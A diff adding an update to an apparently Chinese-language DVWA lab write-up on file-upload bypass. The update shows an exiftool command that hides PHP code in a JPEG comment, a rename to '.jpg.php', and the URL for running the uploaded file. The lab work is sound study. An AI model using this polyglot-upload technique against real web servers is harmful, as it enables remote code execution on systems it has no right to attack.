@@ -68,3 +68,22 @@ http://localhost:8086/hackable/uploads/yo.php
 ![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/0fa61ad0-ae2d-4654-b092-f881fc3ff75d/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220215%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220215T171113Z&X-Amz-Expires=86400&X-Amz-Signature=00538e46cad98457de7077e0418d9c076893d65406a301c447e278d1f72d8b6e&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)
 
 ![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/b8b021c5-5525-4870-a47e-4b11d8c74a0f/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220215%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220215T171117Z&X-Amz-Expires=86400&X-Amz-Signature=8191eee2306fd26b8c1bc42ad96f84f37e05f41234d34661c8730c5c75534235&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)
+
+---
+## Update February 19, 2022
+
+### 修正: executable image
+
+### 使用 `exiftool` 將惡意內容寫入要上傳的圖片，然後再更改檔名上傳即可，這個方式比較好
+
+```bash
+exiftool -Comment="<?php phpinfo(); __halt_compiler(); ?>" demo-upload.jpg
+```
+
+```php
+mv demo-upload.jpg demo-upload.jpg.php
+```
+```php
+http://dvwa.localtest/hackable/uploads/demo-upload.jpg.php
+```
+![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/300dad9f-b7b3-4615-a49c-a1dc9d6f1283/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220219%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220219T084448Z&X-Amz-Expires=86400&X-Amz-Signature=09d70488a1a19106326372efe8f66ae540e8507f5ff0e5648b8816ddd43dd2d1&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)
